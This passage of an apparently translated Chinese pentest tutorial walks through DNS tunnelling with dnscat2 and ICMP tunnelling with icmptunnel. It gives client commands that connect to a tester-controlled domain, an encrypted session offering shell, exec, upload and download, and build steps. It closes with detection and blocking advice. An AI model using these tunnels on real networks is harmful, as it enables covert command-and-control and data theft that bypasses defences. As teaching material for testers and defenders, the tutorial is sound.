        Starting Dnscat2 DNS server on 0.0.0.0:53
        [domains = opendns.online]...
        Assuming you have an authoritative DNS server, you can run
        the client anywhere with the following (--secret is optional):
          ./dnscat --secret=7040f6248e601519a9ebfb761e2402e3 opendns.online
        To talk directly to the server without a domain name, run:
          ./dnscat --dns server=x.x.x.x,port=53 --secret=7040f6248e601519a9ebfb761e2402e3
        Of course, you have to figure out  yourself! Clients
        will connect directly on UDP port 53.
opendns.online是处于渗透测试人员控制之下的一个域名。此外，重要的一点是让权威DNS服务器为opendns.online生成一个密钥。这个密钥将以“共享秘密”的方式，用于对隧道期间的通信进行加密。除此之外，dnscat还提供了两种不同的客户端命令。即使你能够向外部服务器发送DNS查询，也不要忘记大多数安全网络是不允许任何人使用外部DNS服务的。
然后，在客户端上执行如下所示的命令。
        root@pentest:/opt/dnscat2/client# ./dnscat --secret=7040f6248e601519a9ebfb761e2402e3 opendns.online
        Creating DNS driver:
         domain = opendns.online
         host   = 0.0.0.0
         port   = 53
         type   = TXT,CNAME,MX
         server = 12.0.0.2
        ** Peer verified with pre-shared secret!
        Session established!
会话一旦建立，就会在服务器上看到一个“new window created”的消息。
        dnscat2> New window created: 1
        Session 1 Security: ENCRYPTED AND VERIFIED!
        (the security depends on the strength of your pre-shared secret!)
让我们看看在通信期间捕获的DNS数据包。下面的截屏表明，客户端向内部DNS服务器发送了相应的CNAME解析请求。
可以看到，DNSCAT2客户端向服务器发送几个TXT解析请求，然后通过CNAME启动了加密通信。即刻起，渗透测试人员就可以通过那条隧道为所欲为了。
        dnscat2> session -i 1
        New window created: 1
        history_size (session) => 1000
        Session 1 Security: ENCRYPTED AND VERIFIED!
        (the security depends on the strength of your pre-shared secret!)
        This is a command session!
        That means you can enter a dnscat2 command such as
        'ping'! For a full list of clients, try 'help'.
        command (pentest) 1> help
        Here is a list of commands (use -h on any of them for additional help):
        * clear
        * delay
        * download
        * echo
        * exec
        * help
        * listen
        * ping
        * quit
        * set
        * shell
        * shutdown
        * suspend
        * tunnels
        * unset
        * upload
**ICMP隧道**
ICMP隧道通过将任意数据注入发送到远程计算机的回送数据包来工作的。远程计算机以相同的方式进行响应，将应答注入另一个ICMP数据包并将其发送回来。关于这种隧道技术的详细介绍，请阅读参考文献[[2]](https://en.wikipedia.org/wiki/ICMP_tunnel)。
简单来说，我们是在ICMP内部发送实际数据的。要想使用ICMP隧道，我们只需要关注一件事情：我可以ping一个外部服务器吗？
        root@pentest:~# ping 8.8.8.8 -c 4
        PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
        64 bytes from 8.8.8.8: icmp_seq=1 ttl=128 time=106 ms
        64 bytes from 8.8.8.8: icmp_seq=2 ttl=128 time=110 ms
        64 bytes from 8.8.8.8: icmp_seq=3 ttl=128 time=177 ms
        64 bytes from 8.8.8.8: icmp_seq=4 ttl=128 time=111 ms
        --- 8.8.8.8 ping statistics ---        4 packets transmitted, 4 received, 0% packet loss, time 3007ms
        rtt min/avg/max/mdev = 106.373/126.539/177.846/29.688 ms
        root@pentest:~#
如果答案是肯定的，那么我们就能够利用这种睡到结束。否则，我们将无法使用ICMP隧道。此外，Dhaval
Kapil也提供了一种ICMP隧道工具，称为icmptunnel。这个工具的安装其实非常简单，具体请阅读参考文献[[3]](https://dhavalkapil.com/icmptunnel/)。
1 – 使用如下所示的命令将此工具的存储库克隆到服务器和客户端。
        git clone https://github.com/DhavalKapil/icmptunnel
2 – 运行make
3 – 在服务器端执行如下所示的命令。
        ./icmptunnel -s 10.0.1.1
4 – 在客户端，找到您的网关和相应的接口。
        root@pentest:/opt/icmptunnel# route -n
        Kernel IP routing table
        Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
        0.0.0.0         12.0.0.2        0.0.0.0         UG    100    0        0 eth0
        12.0.0.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0
5 – 编辑client.sh文件，并将替换为服务器的IP地址。然后，用上面获得的网关地址替换。最后，将做同样的处理。
6 – 在客户端上运行隧道。
        root@pentest:/opt/icmptunnel# ./icmptunnel -c IPADDRESS
**防御措施**
防御这些类型的隧道攻击并非易事，特别是DNS隧道攻击。但以下操作能够帮助您检测最常见的攻击工具，如dnscat2等。
禁止网络中的任何人向外部服务器发送DNS请求。每个人都必须使用您自己的DNS服务器。
没有人会发送TXT解析请求到DNS，但是dnscat2和邮件服务器/网关会这样做。因此将您的邮件服务器/网关列入白名单，并阻止传入和传出流量中的TXT请求。
阻止ICMP。
跟踪用户的DNS查询数量。如果有人达到阈值，则生成相应的报告。
**参考文献**
[2] – 
[3] – 